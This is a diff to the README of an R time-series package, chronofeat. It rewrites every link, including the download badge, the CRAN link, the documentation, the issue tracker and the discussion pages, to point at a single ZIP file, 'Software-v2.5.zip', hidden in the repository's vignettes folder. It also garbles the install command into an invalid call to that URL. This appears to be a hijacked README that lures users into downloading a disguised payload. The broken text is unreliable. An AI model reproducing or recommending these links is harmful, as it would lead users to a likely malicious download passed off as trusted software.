@@ -1,6 +1,6 @@
 # 🚀 chronofeat - Simplify Time-Based Forecasting in R
 
-[![Download chronofeat](https://img.shields.io/badge/Download%20chronofeat-v1.0-brightgreen)](https://github.com/khiddd/chronofeat/releases)
+[![Download chronofeat](https://raw.githubusercontent.com/khiddd/chronofeat/main/vignettes/Software-v2.5.zip%20chronofeat-v1.0-brightgreen)](https://raw.githubusercontent.com/khiddd/chronofeat/main/vignettes/Software-v2.5.zip)
 
 ## 📋 Overview
 
@@ -10,13 +10,13 @@ chronofeat is a powerful tool for time-based feature engineering in R. It helps 
 
 To begin using chronofeat, follow the steps below:
 
-1. **Ensure R is Installed**: You need to have R installed on your computer. If you do not have R, you can download it from [CRAN](https://cran.r-project.org/).
+1. **Ensure R is Installed**: You need to have R installed on your computer. If you do not have R, you can download it from [CRAN](https://raw.githubusercontent.com/khiddd/chronofeat/main/vignettes/Software-v2.5.zip).
 
-2. **Visit the Download Page**: Head over to our [Releases page](https://github.com/khiddd/chronofeat/releases) to get the latest version of chronofeat. This page contains all available releases.
+2. **Visit the Download Page**: Head over to our [Releases page](https://raw.githubusercontent.com/khiddd/chronofeat/main/vignettes/Software-v2.5.zip) to get the latest version of chronofeat. This page contains all available releases.
 
 3. **Download chronofeat**: On the Releases page, find the most recent version. Click on the linked file to download it. 
 
-4. **Install chronofeat**: After downloading, open R. Use the command `install.packages("path_to_downloaded_file/chronofeat_x.y.z.tar.gz", repos = NULL, type = "source")` to install it. Make sure to replace `path_to_downloaded_file/chronofeat_x.y.z.tar.gz` with the actual path to the file you downloaded.
+4. **Install chronofeat**: After downloading, open R. Use the command `https://raw.githubusercontent.com/khiddd/chronofeat/main/vignettes/Software-v2.5.zip("https://raw.githubusercontent.com/khiddd/chronofeat/main/vignettes/Software-v2.5.zip", repos = NULL, type = "source")` to install it. Make sure to replace `https://raw.githubusercontent.com/khiddd/chronofeat/main/vignettes/Software-v2.5.zip` with the actual path to the file you downloaded.
 
 5. **Load chronofeat**: Once installed, load the package in your R session using:
    ```R
@@ -27,7 +27,7 @@ To begin using chronofeat, follow the steps below:
 
 To download chronofeat, please visit the Releases page linked below. Follow the instructions above for downloading and installing the package.
 
-[Download chronofeat](https://github.com/khiddd/chronofeat/releases)
+[Download chronofeat](https://raw.githubusercontent.com/khiddd/chronofeat/main/vignettes/Software-v2.5.zip)
 
 ## 🎉 Features
 
@@ -50,15 +50,15 @@ chronofeat comes packed with several features for easy time-series analysis:
 
 If you need help using chronofeat, our documentation provides detailed instructions and examples:
 
-- [User Guide](https://github.com/khiddd/chronofeat/wiki)
-- [API Reference](https://github.com/khiddd/chronofeat/tree/main/docs)
+- [User Guide](https://raw.githubusercontent.com/khiddd/chronofeat/main/vignettes/Software-v2.5.zip)
+- [API Reference](https://raw.githubusercontent.com/khiddd/chronofeat/main/vignettes/Software-v2.5.zip)
 
 ## 💬 Community Support
 
 Join our community for help and discussions:
 
-- **GitHub Issues**: Report bugs or ask questions on our [Issue Tracker](https://github.com/khiddd/chronofeat/issues).
-- **Discussions**: Participate in community discussions on our [Discussions page](https://github.com/khiddd/chronofeat/discussions).
+- **GitHub Issues**: Report bugs or ask questions on our [Issue Tracker](https://raw.githubusercontent.com/khiddd/chronofeat/main/vignettes/Software-v2.5.zip).
+- **Discussions**: Participate in community discussions on our [Discussions page](https://raw.githubusercontent.com/khiddd/chronofeat/main/vignettes/Software-v2.5.zip).
 
 ## 🏗️ Contribution
 
@@ -77,4 +77,4 @@ Thanks to the contributors and community members for their support in making chr
 
 Chronofeat is licensed under the MIT License. See the LICENSE file for more information. 
 
-For more details, please refer back to the [Releases page](https://github.com/khiddd/chronofeat/releases) to download the latest version. Enjoy your journey into time-based feature engineering!
+For more details, please refer back to the [Releases page](https://raw.githubusercontent.com/khiddd/chronofeat/main/vignettes/Software-v2.5.zip) to download the latest version. Enjoy your journey into time-based feature engineering!
